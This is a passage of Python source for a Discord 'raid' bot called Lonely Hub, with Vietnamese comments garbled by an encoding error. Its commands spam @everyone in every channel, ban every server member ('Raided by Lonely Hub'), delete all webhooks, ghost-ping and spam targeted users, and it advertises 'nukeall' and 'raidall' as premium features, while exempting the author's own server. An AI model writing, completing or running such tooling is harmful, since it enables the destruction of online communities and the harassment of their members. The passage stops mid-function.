    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, "?spampingall", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "?spampingall", guild_name, "Text Command")
    
    try:
        message_content = "@everyone"
        
        msg_count = 0
        status_msg = await ctx.send("Starting spam ping all channels...")
        
        # G·ª≠i tin nh·∫Øn ƒë·∫øn t·∫•t c·∫£ c√°c k√™nh
        for channel in ctx.guild.text_channels:
            try:
                if channel.permissions_for(ctx.guild.me).send_messages and channel.permissions_for(ctx.guild.me).mention_everyone:
                    await channel.send(message_content)
                    msg_count += 1
                    await asyncio.sleep(0)  # Kh√¥ng delay
            except Exception as e:
                print(f"L·ªói g·ª≠i tin nh·∫Øn ƒë·∫øn {channel.name}: {e}")
        
        await status_msg.delete()
        
        # Th√¥ng b√°o th√†nh c√¥ng
        embed = discord.Emembed(
            title="‚úÖ Ho√†n th√†nh",
            description=f"ƒê√£ g·ª≠i {msg_count} tin nh·∫Øn ping ƒë·∫øn t·∫•t c·∫£ k√™nh",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# L·ªánh ?banalluser - Ban t·∫•t c·∫£ user trong server
@bot.command()
async def banalluser(ctx):
    """Ban t·∫•t c·∫£ user trong server"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, "?banalluser", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "?banalluser", guild_name, "Text Command")
    
    try:
        if not ctx.guild.me.guild_permissions.ban_members:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Bot kh√¥ng c√≥ quy·ªÅn ban members!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        status_msg = await ctx.send("Starting ban all users...")
        banned_count = 0
        
        # Ban t·∫•t c·∫£ user
        for member in ctx.guild.members:
            try:
                if member != ctx.guild.me and member != ctx.author:
                    await member.ban(reason="Raided by Lonely Hub")
                    banned_count += 1
                    await asyncio.sleep(0)  # Kh√¥ng delay
            except Exception as e:
                print(f"L·ªói ban user {member.name}: {e}")
        
        await status_msg.delete()
        
        # Th√¥ng b√°o th√†nh c√¥ng
        embed = discord.Embed(
            title="‚úÖ Ho√†n th√†nh",
            description=f"ƒê√£ ban {banned_count} user",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# L·ªánh ?purge - X√≥a tin nh·∫Øn
@bot.command()
async def purge(ctx, quantity: int):
    """X√≥a s·ªë l∆∞·ª£ng tin nh·∫Øn ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, f"?purge {quantity}", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, f"?purge {quantity}", guild_name, "Text Command")
    
    try:
        if not ctx.guild.me.guild_permissions.manage_messages:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Bot kh√¥ng c√≥ quy·ªÅn qu·∫£n l√Ω tin nh·∫Øn!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        if quantity <= 0:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="S·ªë l∆∞·ª£ng tin nh·∫Øn ph·∫£i l·ªõn h∆°n 0!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        # X√≥a tin nh·∫Øn
        deleted = await ctx.channel.purge(limit=quantity + 1)  # +1 ƒë·ªÉ x√≥a c·∫£ tin nh·∫Øn l·ªánh
        
        # Th√¥ng b√°o th√†nh c√¥ng
        embed = discord.Embed(
            title="‚úÖ Ho√†n th√†nh",
            description=f"ƒê√£ x√≥a {len(deleted) - 1} tin nh·∫Øn",
            color=discord.Color.green()
        )
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(3)
        await msg.delete()
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# L·ªánh ?purgeallwebhook - X√≥a t·∫•t c·∫£ webhook
@bot.command()
async def purgeallwebhook(ctx):
    """X√≥a t·∫•t c·∫£ webhook trong server"""
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå B·ªã c·∫•m",
            description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra quy·ªÅn
    if not is_user_allowed(ctx.author.id):
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
    if ctx.guild and ctx.guild.id == RESTRICTED_GUILD_ID:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return
    
    # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
    user = f"{ctx.author.name}#{ctx.author.discriminator}"
    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
    log_message = log_command(user, "?purgeallwebhook", guild_name, "Text Command")
    
    # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
    await send_dm_notification(user, "?purgeallwebhook", guild_name, "Text Command")
    
    try:
        if not ctx.guild.me.guild_permissions.manage_webhooks:
            embed = discord.Embed(
                title="‚ùå L·ªói",
                description="Bot kh√¥ng c√≥ quy·ªÅn qu·∫£n l√Ω webhooks!",
                color=discord.Color.red()
            )
            await ctx.send(embed=embed)
            return
        
        status_msg = await ctx.send("Deleting all webhooks...")
        deleted_count = 0
        
        # X√≥a t·∫•t c·∫£ webhook
        for channel in ctx.guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                for webhook in webhooks:
                    await webhook.delete()
                    deleted_count += 1
            except Exception as e:
                print(f"L·ªói x√≥a webhook trong {channel.name}: {e}")
        
        await status_msg.delete()
        
        # Th√¥ng b√°o th√†nh c√¥ng
        embed = discord.Embed(
            title="‚úÖ Ho√†n th√†nh",
            description=f"ƒê√£ x√≥a {deleted_count} webhook",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(
            title="‚ùå L·ªói",
            description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

# ==================== TEXT COMMAND HANDLER ====================

@bot.event
async def on_message(message):
    # B·ªè qua tin nh·∫Øn t·ª´ bot
    if message.author == bot.user:
        return
    
    # Ki·ªÉm tra xem user c√≥ b·ªã c·∫•m kh√¥ng
    if is_user_banned(message.author.id):
        # Ch·ªâ ph·∫£n h·ªìi n·∫øu l√† l·ªánh
        if message.content.startswith(('!', '?', '.')):
            embed = discord.Embed(
                title="‚ùå B·ªã c·∫•m",
                description="B·∫°n ƒë√£ b·ªã c·∫•m s·ª≠ d·ª•ng bot n√†y!",
                color=discord.Color.red()
            )
            await message.reply(embed=embed, mention_author=False)
        return
    
    # X·ª≠ l√Ω c√°c l·ªánh text command
    if message.content.startswith(('!', '?', '.')):
        # T√°ch l·ªánh v√† tham s·ªë
        content = message.content[1:]  # B·ªè k√Ω t·ª± prefix ƒë·∫ßu ti√™n
        parts = content.split()
        command = parts[0].lower() if parts else ""
        args = parts[1:] if len(parts) > 1 else []
        
        # LOG TR∆Ø·ªöC KHI X·ª¨ L√ù
        user = f"{message.author.name}#{message.author.discriminator}"
        guild_name = message.guild.name if message.guild else "Direct Message"
        log_message = log_command(user, message.content, guild_name, "Text Command")
        
        # G·ª≠i DM th√¥ng b√°o v·ªõi Embed
        await send_dm_notification(user, message.content, guild_name, "Text Command")
        
        # X·ª≠ l√Ω c√°c l·ªánh text command
        if command == "ping":
            latency = round(bot.latency * 1000)
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="üèì Pong!",
                description=f"ƒê·ªô tr·ªÖ: **{latency}ms**\n‚è∞ Th·ªùi gian: **{current_time.strftime('%H:%M:%S %d/%m/%Y')}** (UTC+7)",
                color=discord.Color.green(),
                timestamp=current_time
            )
            embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
            embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "help":
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="ü§ñ Lonely Hub - H·ªá Th·ªëng L·ªánh",
                description="Xin ch√†o! ƒê√¢y l√† danh s√°ch ƒë·∫ßy ƒë·ªß c√°c l·ªánh c√≥ trong bot.\n\n**üìä Th√¥ng tin bot:**\n‚Ä¢ Prefix: `!`, `?`, `.`, `/`\n‚Ä¢ M√∫i gi·ªù: `UTC+7`\n‚Ä¢ Phi√™n b·∫£n: `1.0.0`",
                color=0x00ffaa,
                timestamp=current_time
            )
            
            # Th√™m c√°c l·ªánh th√¥ng th∆∞·ªùng
            embed.add_field(
                name="üîß L·ªÜNH C∆† B·∫¢N",
                value=(
                    "‚Ä¢ `ping` - Ki·ªÉm tra ƒë·ªô tr·ªÖ c·ªßa bot\n"
                    "‚Ä¢ `info` - Xem th√¥ng tin v·ªÅ bot\n"
                    "‚Ä¢ `time` - Xem gi·ªù hi·ªán t·∫°i UTC+7\n"
                    "‚Ä¢ `users` - Xem danh s√°ch user ƒë∆∞·ª£c ph√©p\n"
                    "‚Ä¢ `help` - Hi·ªÉn th·ªã tr·ª£ gi√∫p n√†y"
                ),
                inline=False
            )
            
            # Th√™m c√°c l·ªánh ƒë·∫∑c bi·ªát (ch·ªâ cho admin)
            if is_user_allowed(message.author.id):
                embed.add_field(
                    name="‚ö° L·ªÜNH ADMIN (Ch·ªâ cho user ƒë∆∞·ª£c ph√©p)",
                    value=(
                        "‚Ä¢ `ghostping <user_id> [delay] [quantity]` - Ghost ping ng∆∞·ªùi d√πng\n"
                        "‚Ä¢ `dms <user_id> <message>` - G·ª≠i tin nh·∫Øn DM ƒë·∫øn ng∆∞·ªùi d√πng\n"
                        "‚Ä¢ `spam <message> <quantity> [user_id]` - Spam tin nh·∫Øn\n"
                        "‚Ä¢ `premium_command` - Xem c√°c l·ªánh premium"
                    ),
                    inline=False
                )
            else:
                embed.add_field(
                    name="üîí L·ªÜNH ADMIN",
                    value="*B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng c√°c l·ªánh admin*",
                    inline=False
                )
            
            # Th√™m th√¥ng tin v·ªÅ auto response
            embed.add_field(
                name="ü§ñ T·ª∞ ƒê·ªòNG PH·∫¢N H·ªíI",
                value=(
                    "Bot s·∫Ω t·ª± ƒë·ªông ph·∫£n h·ªìi khi nh·∫≠n di·ªán c√°c t·ª´ kh√≥a:\n"
                    "‚Ä¢ `client`, `executor`, `executors` - Hi·ªÉn th·ªã danh s√°ch client\n"
                    "‚Ä¢ `lu·∫≠t` - H∆∞·ªõng d·∫´n xem lu·∫≠t\n"
                    "‚Ä¢ `m√°y ·∫£o`, `c√°ch nh·∫≠n m√°y ·∫£o` - H∆∞·ªõng d·∫´n nh·∫≠n m√°y ·∫£o"
                ),
                inline=False
            )
            
            # Th√™m th√¥ng tin footer
            embed.add_field(
                name="üìù GHI CH√ö",
                value=(
                    "‚Ä¢ C√°c l·ªánh admin ch·ªâ d√†nh cho user ƒë∆∞·ª£c c·∫•p quy·ªÅn\n"
                    "‚Ä¢ T·∫•t c·∫£ l·ªánh ƒë·ªÅu ƒë∆∞·ª£c ghi log v√† th√¥ng b√°o qua DM\n"
                    "‚Ä¢ Th·ªùi gian hi·ªÉn th·ªã l√† UTC+7 (Vi·ªát Nam)"
                ),
                inline=False
            )
            
            # Set author, thumbnail, footer
            embed.set_author(name="Lonely Hub Help System", icon_url=ICON_URL)
            embed.set_thumbnail(url=ICON_URL)
            embed.set_footer(
                text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')} | Y√™u c·∫ßu b·ªüi {user}",
                icon_url=FOOTER_ICON_URL
            )
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "info":
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="ü§ñ Bot Information",
                description="Bot logging system v·ªõi UTC+7",
                color=discord.Color.blue(),
                timestamp=current_time
            )
            
            embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
            embed.add_field(name="üïê M√∫i gi·ªù", value="UTC+7", inline=True)
            embed.add_field(name="üìä S·ªë server", value=str(len(bot.guilds)), inline=True)
            embed.add_field(name="‚ö° ƒê·ªô tr·ªÖ", value=f"{round(bot.latency * 1000)}ms", inline=True)
            embed.add_field(name="üìù Logging", value="Text commands & Slash commands", inline=False)
            embed.add_field(name="üì® DM Notification", value=f"G·ª≠i ƒë·∫øn {len(ALLOWED_USERS)} user", inline=True)
            embed.add_field(name="üë• User ƒë∆∞·ª£c ph√©p spam", value=str(len(ALLOWED_USERS)), inline=True)
            embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
            embed.set_thumbnail(url=ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "time":
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="üïê Th·ªùi gian hi·ªán t·∫°i",
                description=f"**UTC+7 (Vi·ªát Nam)**\n```{current_time.strftime('%H:%M:%S %d/%m/%Y')}```",
                color=discord.Color.gold(),
                timestamp=current_time
            )
            
            embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
            embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
            embed.set_thumbnail(url=ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "users":
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="üë• Danh s√°ch User ƒë∆∞·ª£c ph√©p",
                description=get_allowed_users_table(),
                color=discord.Color.purple(),
                timestamp=current_time
            )
            
            embed.set_author(name="Lonely Hub", icon_url=ICON_URL)
            embed.set_footer(text=f"Lonely Hub | {current_time.strftime('%H:%M:%S %d/%m/%Y')}", icon_url=FOOTER_ICON_URL)
            embed.set_thumbnail(url=ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "premium_command":
            # Ki·ªÉm tra quy·ªÅn
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
                
            current_time = get_utc7_time()
            
            embed = discord.Embed(
                title="Premium Commands",
                description="List of available premium command",
                color=0x00ffaa,
                timestamp=current_time
            )
            
            # Set author v·ªõi icon
            embed.set_author(
                name="Lonely Hub Bot",
                icon_url=ICON_URL
            )
            
            # Th√™m c√°c l·ªánh premium
            embed.add_field(
                name="**?nukeall**",
                value=(
                    "Nuke the server with ping everyone\n\n"
                    "**Requirements:** Bot must have permission to create, delete channels, rename servers and ping everyone"
                ),
                inline=False
            )
            
            embed.add_field(
                name="**?raidall**",
                value=(
                    "Raid all channel with ping everyone and message.\n\n"
                    "**Requirements:** Bot must have permission to ping everyone."
                ),
                inline=False
            )
            
            embed.add_field(
                name="**?spampingall**",
                value="Spam ping everyone all channels",
                inline=False
            )
            
            embed.add_field(
                name="**?banalluser**",
                value=(
                    "Ban all user with ultra-speed\n\n"
                    "**Requirements:** The bot needs to have the highest role in the server."
                ),
                inline=False
            )
            
            embed.add_field(
                name="**?purge [quantity]**",
                value=(
                    "X√≥a s·ªë l∆∞·ª£ng tin nh·∫Øn ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh\n\n"
                    "**Requirements:** Bot must have permission to manage messages."
                ),
                inline=False
            )
            
            embed.add_field(
                name="**?purgeallwebhook**",
                value=(
                    "X√≥a t·∫•t c·∫£ webhook trong server\n\n"
                    "**Requirements:** Bot must have permission to manage webhooks."
                ),
                inline=False
            )
            
            # Set footer v·ªõi icon
            embed.set_footer(
                text="Lonely Hub Bot",
                icon_url=FOOTER_ICON_URL
            )
            
            # Set thumbnail
            embed.set_thumbnail(url=ICON_URL)
            
            await message.reply(embed=embed, mention_author=False)
        
        elif command == "ghostping":
            # Ki·ªÉm tra quy·ªÅn
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
            if message.guild and message.guild.id == RESTRICTED_GUILD_ID:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="L·ªánh n√†y kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng trong server n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 1:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!ghostping <user_id> [delay] [quantity]`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            user_id = args[0]
            delay = 0.5
            quantity = 5
            
            # X·ª≠ l√Ω tham s·ªë t√πy ch·ªçn
            if len(args) >= 2:
                try:
                    delay = float(args[1])
                except ValueError:
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="Delay ph·∫£i l√† s·ªë!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
            
            if len(args) >= 3:
                try:
                    quantity = int(args[2])
                except ValueError:
                    embed = discord.Embed(
                        title="‚ùå L·ªói",
                        description="Quantity ph·∫£i l√† s·ªë nguy√™n!",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=embed, mention_author=False)
                    return
            
            # Ki·ªÉm tra gi·ªõi h·∫°n delay
            if delay < 0.1:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="Delay t·ªëi thi·ªÉu l√† 0.1 gi√¢y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra gi·ªõi h·∫°n s·ªë l∆∞·ª£ng
            if quantity > 50:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="S·ªë l∆∞·ª£ng ping t·ªëi ƒëa l√† 50!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            if quantity <= 0:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="S·ªë l∆∞·ª£ng ping ph·∫£i l·ªõn h∆°n 0!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ph·∫£n h·ªìi ban ƒë·∫ßu
            embed = discord.Embed(
                title="‚è≥ ƒêang x·ª≠ l√Ω...",
                description=f"ƒêang chu·∫©n b·ªã ghost ping {quantity} l·∫ßn v·ªõi delay {delay}s...",
                color=discord.Color.orange()
            )
            processing_msg = await message.reply(embed=embed, mention_author=False)
            
            try:
                # Chuy·ªÉn ƒë·ªïi user_id sang integer
                target_user_id = int(user_id)
                
                # L·∫•y th√¥ng tin user
                target_user = await bot.fetch_user(target_user_id)
                
                # Th·ª±c hi·ªán ghost ping
                sent_count = 0
                for i in range(quantity):
                    try:
                        # G·ª≠i tin nh·∫Øn ping
                        ping_message = await message.channel.send(f"{target_user.mention}")
                        await asyncio.sleep(0.5)  # ƒê·ª£i 0.5 gi√¢y
                        
                        # X√≥a tin nh·∫Øn
                        await ping_message.delete()
                        sent_count += 1
                        
                        # ƒê·ª£i delay (tr·ª´ ƒëi 0.5 gi√¢y ƒë√£ ƒë·ª£i)
                        remaining_delay = max(0, delay - 0.5)
                        if i < quantity - 1 and remaining_delay > 0:  # Kh√¥ng ƒë·ª£i sau l·∫ßn ping cu·ªëi
                            await asyncio.sleep(remaining_delay)
                            
                    except discord.Forbidden:
                        embed = discord.Embed(
                            title="‚ùå L·ªói",
                            description="Bot kh√¥ng c√≥ quy·ªÅn x√≥a tin nh·∫Øn!",
                            color=discord.Color.red()
                        )
                        await processing_msg.edit(embed=embed)
                        return
                    except Exception as e:
                        print(f"L·ªói khi ghost ping: {e}")
                
                # Th√¥ng b√°o th√†nh c√¥ng
                embed = discord.Embed(
                    title="‚úÖ Ho√†n th√†nh",
                    description=f"ƒê√£ th·ª±c hi·ªán {sent_count}/{quantity} l·∫ßn ghost ping ƒë·∫øn {target_user.mention}",
                    color=discord.Color.green()
                )
                await processing_msg.edit(embed=embed)
                
            except ValueError:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="User ID kh√¥ng h·ª£p l·ªá!",
                    color=discord.Color.red()
                )
                await processing_msg.edit(embed=embed)
            except discord.NotFound:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="Kh√¥ng t√¨m th·∫•y user!",
                    color=discord.Color.red()
                )
                await processing_msg.edit(embed=embed)
            except Exception as e:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await processing_msg.edit(embed=embed)
        
        elif command == "dms":
            # Ki·ªÉm tra quy·ªÅn
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra tham s·ªë
            if len(args) < 2:
                embed = discord.Embed(
                    title="‚ùå Thi·∫øu tham s·ªë",
                    description="C√∫ ph√°p: `!dms <user_id> <message>`",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            user_id = args[0]
            dm_message = " ".join(args[1:])
            
            try:
                # Chuy·ªÉn ƒë·ªïi user_id sang integer
                target_user_id = int(user_id)
                
                # L·∫•y th√¥ng tin user
                target_user = await bot.fetch_user(target_user_id)
                
                # Th·ª≠ g·ª≠i tin nh·∫Øn
                try:
                    await target_user.send(f"{dm_message}")
                    
                    # Th√¥ng b√°o th√†nh c√¥ng
                    embed = discord.Embed(
                        title="‚úÖ ƒê√£ g·ª≠i tin nh·∫Øn",
                        description=f"ƒê√£ g·ª≠i tin nh·∫Øn ƒë·∫øn {target_user.mention}",
                        color=discord.Color.green()
                        )
                    await message.reply(embed=embed, mention_author=False)
                    
                except discord.Forbidden:
                    # N·∫øu kh√¥ng g·ª≠i ƒë∆∞·ª£c, g·ª≠i th√¥ng b√°o l·ªói cho ng∆∞·ªùi d√πng
                    error_embed = discord.Embed(
                        title="‚ùå Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn",
                        description=f"Kh√¥ng th·ªÉ g·ª≠i tin nh·∫Øn ƒë·∫øn {target_user.mention}\n\n**L√Ω do:** User ƒë√£ ch·∫∑n DM ho·∫∑c bot kh√¥ng c√≥ quy·ªÅn g·ª≠i tin nh·∫Øn",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=error_embed, mention_author=False)
                    
                except Exception as e:
                    # X·ª≠ l√Ω c√°c l·ªói kh√°c
                    error_embed = discord.Embed(
                        title="‚ùå L·ªói khi g·ª≠i tin nh·∫Øn",
                        description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                        color=discord.Color.red()
                    )
                    await message.reply(embed=error_embed, mention_author=False)
                    
            except ValueError:
                # User ID kh√¥ng h·ª£p l·ªá
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="User ID kh√¥ng h·ª£p l·ªá! Vui l√≤ng nh·∫≠p ID ƒë√∫ng ƒë·ªãnh d·∫°ng s·ªë.",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                
            except discord.NotFound:
                # Kh√¥ng t√¨m th·∫•y user
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng v·ªõi ID n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                
            except Exception as e:
                # L·ªói kh√°c
                error_embed = discord.Embed(
                    title="‚ùå L·ªói kh√¥ng x√°c ƒë·ªãnh",
                    description=f"ƒê√£ x·∫£y ra l·ªói: {str(e)}",
                    color=discord.Color.red()
                )
                await message.reply(embed=error_embed, mention_author=False)
        
        elif command == "spam":
            # Ki·ªÉm tra quy·ªÅn s·ª≠ d·ª•ng l·ªánh
            if not is_user_allowed(message.author.id):
                embed = discord.Embed(
                    title="‚ùå L·ªói",
                    description="B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y!",
                    color=discord.Color.red()
                )
                await message.reply(embed=embed, mention_author=False)
                return
            
            # Ki·ªÉm tra n·∫øu ƒëang ·ªü guild b·ªã c·∫•m
            if message.guild and message.guild.id == RESTRICTED_GUILD_ID:
                embed = discord.Embed(
                    title="‚ùå L·ªói",
